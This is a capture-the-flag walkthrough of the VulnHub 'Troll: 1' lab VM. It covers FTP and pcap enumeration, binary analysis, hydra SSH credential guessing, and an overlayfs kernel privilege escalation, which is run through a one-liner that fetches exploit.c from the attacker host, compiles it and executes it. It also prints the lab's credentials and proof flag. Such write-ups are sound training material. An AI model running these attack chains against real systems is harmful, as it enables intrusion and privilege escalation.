---
title: Troll Vunhub Machine Writeup and Walkthrough
author: Gaurav Raj
date: 2021-06-25 13:30:00 +0800
categories: [CTF, Vulnhub]
tags: [ctf, vulnhub, boot2root, writeup, walkthrough, ftp, ssh, python, python3, overlay-fs, kernel-exploit, kernel exploit, thehackersbrain, hackersbrai, gaurav raj]

---


## Troll: 1
> OSCP Labs inspired machine on VulnHub

### Description
Tr0ll was inspired by the constant trolling of the machines within the OSCP labs.
The goal is simple, gain root and get Proof.txt from the /root directory.
Not for the easily frustrated! Fair warning, there be trolls ahead!
Difficulty: Beginner ; Type: boot2root

## Configuration
- Used `vmdk` file to configure the box
- `Bridged Network` from `wlan0` used for getting IP.

## Discovering the Machine
```shell-session
┌──(elliot@kali)-[~]
└─$ sudo nmap -sS 192.168.225.1/24                                                        1 ⨯
[sudo] password for elliot: 
Starting Nmap 7.91 ( https://nmap.org ) at 2021-06-25 11:56 IST
Nmap scan report for troll (192.168.225.41)
Host is up (0.00029s latency).
Not shown: 997 closed ports
PORT   STATE SERVICE
21/tcp open  ftp
22/tcp open  ssh
80/tcp open  http
MAC Address: 08:00:27:8D:A3:3B (Oracle VirtualBox virtual NIC)

Nmap scan report for kali (192.168.225.43)
Host is up (0.0000080s latency).
Not shown: 999 closed ports
PORT    STATE SERVICE
902/tcp open  iss-realsecure

Nmap done: 256 IP addresses (2 hosts up) scanned in 8.34 seconds
                                                                                              
┌──(elliot@kali)-[~]
└─$ 
```

## Target IP
```bash
export IP=192.168.225.41
```

## Nmap Scan
```shell-session
# Nmap 7.91 scan initiated Fri Jun 25 12:01:43 2021 as: nmap -sC -sV -A -v -oN nmap/initial 192.168.225.41
Nmap scan report for troll (192.168.225.41)
Host is up (0.00020s latency).
Not shown: 997 closed ports
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.2
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_-rwxrwxrwx    1 1000     0            8068 Aug 10  2014 lol.pcap [NSE: writeable]
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to 192.168.225.43
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 600
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 2
|      vsFTPd 3.0.2 - secure, fast, stable
|_End of status
22/tcp open  ssh     OpenSSH 6.6.1p1 Ubuntu 2ubuntu2 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   1024 d6:18:d9:ef:75:d3:1c:29:be:14:b5:2b:18:54:a9:c0 (DSA)
|   2048 ee:8c:64:87:44:39:53:8c:24:fe:9d:39:a9:ad:ea:db (RSA)
|   256 0e:66:e6:50:cf:56:3b:9c:67:8b:5f:56:ca:ae:6b:f4 (ECDSA)
|_  256 b2:8b:e2:46:5c:ef:fd:dc:72:f7:10:7e:04:5f:25:85 (ED25519)
80/tcp open  http    Apache httpd 2.4.7 ((Ubuntu))
| http-methods: 
|_  Supported Methods: POST OPTIONS GET HEAD
| http-robots.txt: 1 disallowed entry 
|_/secret
|_http-server-header: Apache/2.4.7 (Ubuntu)
|_http-title: Site doesn't have a title (text/html).
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Fri Jun 25 12:01:52 2021 -- 1 IP address (1 host up) scanned in 9.08 seconds
```

## FTP Enumeration
while looking at the nmap result we got, we found that `FTP` server is running and anonymous entry is allowed and we have a file as well called `lol.pcap`. let's check that out.

so logged-in in the FTP server and downloaded the lol.pcap file and got something it here.

### Analyzing the PCAP File
```
220 (vsFTPd 3.0.2)
USER anonymous
331 Please specify the password.
PASS password
230 Login successful.
SYST
215 UNIX Type: L8
PORT 10,0,0,12,173,198
200 PORT command successful. Consider using PASV.
LIST
150 Here comes the directory listing.
226 Directory send OK.
TYPE I
200 Switching to Binary mode.
PORT 10,0,0,12,202,172
200 PORT command successful. Consider using PASV.
RETR secret_stuff.txt
150 Opening BINARY mode data connection for secret_stuff.txt (147 bytes).
226 Transfer complete.
TYPE A
200 Switching to ASCII mode.
PORT 10,0,0,12,172,74
200 PORT command successful. Consider using PASV.
LIST
150 Here comes the directory listing.
226 Directory send OK.
QUIT
221 Goodbye.
```

here we can see something about the `secret_stuff.txt`, let's enumerate more, what else we can find.
and here's the content of the `secret_stuff.txt` file.
```bash
Well, well, well, aren't you just a clever little devil, you almost found the sup3rs3cr3tdirlol :-P

Sucks, you were so close... gotta TRY HARDER!
```

saying something about `/sup3rs3cr3tdirlol`, let's check the webserver for this directory, and there we found a binary file called `roflmao`. running file command on this binary found that, it's `elf` executable, now analyzing the binary with `radare2`.

#### Analyzing the Binary File
```bash
┌──(elliot@kali)-[~/data/troll]
└─$ r2 -d roflmao                 
Process with PID 9028 started...
= attach 9028 9028
bin.baddr 0x08048000
Using 0x8048000
asm.bits 32
glibc.fc_offset = 0x00148
[0xf7f830b0]> aaa
[x] Analyze all flags starting with sym. and entry0 (aa)
[x] Analyze function calls (aac)
[x] Analyze len bytes of instructions for references (aar)
[x] Check for vtables
[TOFIX: aaft can't run in debugger mode.ions (aaft)
[x] Type matching analysis for all functions (aaft)
[x] Propagate noreturn information
[x] Use -AA or aaaa to perform additional experimental analysis.
[0xf7f830b0]> afl
0x08048320    1 33           entry0
0x08048310    1 6            sym.imp.__libc_start_main
0x08048360    4 42           sym.deregister_tm_clones
0x08048390    4 55           sym.register_tm_clones
0x080483d0    3 30           sym.__do_global_dtors_aux
0x080483f0    4 45   -> 44   entry.init0
0x080484b0    1 2            sym.__libc_csu_fini
0x08048350    1 4            sym.__x86.get_pc_thunk.bx
0x080484b4    1 20           sym._fini
0x08048440    4 97           sym.__libc_csu_init
0x0804841d    1 23           main
0x080482f0    1 6            sym.imp.printf
0x080482b4    3 35           sym._init
0x08048300    1 6            loc.imp.__gmon_start__
[0xf7f830b0]> s sym.main 
[0x0804841d]> pdf
            ; DATA XREF from entry0 @ 0x8048337
/ 23: int main (int argc, char **argv, char **envp);
|           0x0804841d      55             push ebp
|           0x0804841e      89e5           mov ebp, esp
|           0x08048420      83e4f0         and esp, 0xfffffff0
|           0x08048423      83ec10         sub esp, 0x10
|           0x08048426      c70424d08404.  mov dword [esp], str.Find_address_0x0856BF_to_proceed ; [0x80484d0:4]=0x646e6946 ; "Find address 0x0856BF to proceed"
|           0x0804842d      e8befeffff     call sym.imp.printf         ; int printf(const char *format)
|           0x08048432      c9             leave
\           0x08048433      c3             ret
[0x0804841d]> 

```

well, now we have find this address as stated in the code.
```bash
; [0x80484d0:4]=0x646e6946 ; "Find address 0x0856BF to proceed"
```

let's check if that's a valid directory inside the webserver.
and yeah, this is a valid directory with some directory listing.
![](/assets/troll/Pasted image 20210625123454.png)

## Breaking into the Machine

so we got a directory called `good_luck` which contains a file called `which_one_lol.txt` which contains potential `usernames`. 

![](/assets/troll/Pasted image 20210625124959.png)
![](/assets/troll/Pasted image 20210625125022.png)

### Bruteforcing SSH.

so here I tried to bruteforce all `usernames` with the `password` specified in the `Pass.txt` file and also with `rockyou.txt` wordlist but no luck so far. But then turned out that the password was the name of the file `Pass.txt` with username `overlfow`
![](/assets/troll/Screenshot from 2021-06-25 12-54-10.png)
```shell-session
┌──(elliot@kali)-[~/data/troll]
└─$ hydra -L which_one_lol.txt -p Pass.txt ssh://192.168.225.41 | tee hydra.log
Hydra v9.1 (c) 2020 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2021-06-25 12:53:57
[DATA] max 10 tasks per 1 server, overall 10 tasks, 10 login tries (l:10/p:1), ~1 try per task
[DATA] attacking ssh://192.168.225.41:22/
[22][ssh] host: 192.168.225.41   login: overflow   password: Pass.txt
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2021-06-25 12:54:01
                                                                                            
┌──(elliot@kali)-[~/data/troll]
└─$
```

Creds: `overflow:Pass.txt`

## Privilege Escalation

while enumerating the shell is being terminated, that's frustrating but bare with it. found that the host machine is using old kernel, which might be vulnerable to maybe any exploit. so here's the kernel version.

```shell-session
overflow@troll:/$ uname -a
Linux troll 3.13.0-32-generic #57-Ubuntu SMP Tue Jul 15 03:51:12 UTC 2014 i686 athlon i686 GNU/Linux
```

and here we found `overlayfs` vulnerability which allows a low privileged user to gain a shell as root. here's the [exploit](https://www.exploit-db.com/exploits/37292)

```shell-session
overflow@troll:/$ cat /etc/os-release
NAME="Ubuntu"
VERSION="14.04.1 LTS, Trusty Tahr"
ID=ubuntu
ID_LIKE=debian
PRETTY_NAME="Ubuntu 14.04.1 LTS"
VERSION_ID="14.04"
HOME_URL="http://www.ubuntu.com/"
SUPPORT_URL="http://help.ubuntu.com/"
BUG_REPORT_URL="http://bugs.launchpad.net/ubuntu/"
```

### Exploiting the Overlay-fs Vulnerability
```shell-session
┌──(elliot@kali)-[~/data/troll]
└─$ ssh overflow@192.168.225.41                                                       255 ⨯
overflow@192.168.225.41's password: 
Welcome to Ubuntu 14.04.1 LTS (GNU/Linux 3.13.0-32-generic i686)

 * Documentation:  https://help.ubuntu.com/

The programs included with the Ubuntu system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
applicable law.


The programs included with the Ubuntu system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
applicable law.

Last login: Fri Jun 25 00:45:13 2021 from kali
$ python -c 'import pty; pty.spawn("/bin/bash")'
overflow@troll:/$ export TERM=xterm
overflow@troll:/$ cd /tmp && wget http://192.168.225.43:8000/exploit.c && gcc exploit.c -o exploit && ./exploit
--2021-06-25 00:53:06--  http://192.168.225.43:8000/exploit.c
Connecting to 192.168.225.43:8000... connected.
HTTP request sent, awaiting response... 200 OK
Length: 5119 (5.0K) [text/x-csrc]
Saving to: ‘exploit.c’

100%[======================================>] 5,119       --.-K/s   in 0s      

2021-06-25 00:53:07 (371 MB/s) - ‘exploit.c’ saved [5119/5119]

spawning threads
mount #1
mount #2
child threads done
/etc/ld.so.preload created
creating shared library
# cd /root     	
# bash
root@troll:/root# cat /root/proof.txt 
Good job, you did it! 


702a8c18d29c6f3ca0d99ef5712bfbdc
root@troll:/root#
```

### Proof Flag
```bash
702a8c18d29c6f3ca0d99ef5712bfbdc
```
